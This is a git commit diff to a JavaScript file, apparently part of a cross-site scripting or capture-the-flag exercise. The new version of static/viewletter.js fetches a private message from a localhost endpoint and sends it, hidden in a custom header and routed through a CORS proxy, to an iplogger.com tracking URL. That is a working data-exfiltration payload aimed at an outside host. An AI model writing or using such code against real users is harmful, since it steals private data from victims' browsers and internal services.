8b715f79ee8dcedc7d25f34cd36a702dfd67646b
ZEN0X9999 <88045705+ZEN0X9999@users.noreply.github.com>
2024-02-07 20:16:55 +0100

    Update viewletter.js

--- static/viewletter.js
+++ static/viewletter.js
@@ -1,48 +1,44 @@
-async function fetchMessageAndSubmit() {
-    try {
-        // Fetch message from the first endpoint
-        const response = await fetch("http://127.0.0.1:80/message/3", {
-            credentials: "omit",
-            headers: {
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
-                Accept: "*/*",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Sec-GPC": "1",
-            },
-            referrer: "http://127.0.0.1:80/letters?id=3",
-            method: "GET",
-            mode: "cors",
+console.log("WERE IN");
+
+function getMessage() {
+    return fetch('http://127.0.0.1:80/message/3')
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(jsonResponse => {
+            return JSON.stringify(jsonResponse); // Convert JSON response to a string
+        })
+        .catch(error => {
+            console.error('There was a problem with the request:', error);
+            return null; // Return null in case of error
         });
-        if (!response.ok) {
-            throw new Error("Failed to fetch message");
-        }
-        const data = await response.json();
-        const message = data.message;
-        
-        // Submit the message to the second endpoint
-        const submitResponse = await fetch("http://127.0.0.1:80/submit", {
-            credentials: "omit",
-            headers: {
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
-                Accept: "*/*",
-                "Accept-Language": "en-US,en;q=0.5",
-                "Content-Type": "application/json",
-                "Sec-GPC": "1",
-            },
-            referrer: "http://127.0.0.1:80/",
-            body: JSON.stringify({ message: message }),
-            method: "POST",
-            mode: "cors",
-        });
-        if (!submitResponse.ok) {
-            throw new Error("Failed to submit message");
-        }
-        
-        console.log("Message submitted successfully");
-    } catch (error) {
-        console.error("There was a problem:", error);
-    }
 }
 
-// Call the function to execute the process
-fetchMessageAndSubmit();
+// Usage
+getMessage()
+    .then(jsonString => {
+        fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://iplogger.com/2KWVg4'), {
+  headers: {
+    'X-Custom-Header': jsonString
+  }
+})
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response.json();
+  })
+  .then(data => {
+    console.log(data.contents); // Handle the JSON response data here
+  })
+  .catch(error => {
+    console.error('There was a problem with the request:', error);
+  });
+    });
+
+
+
+
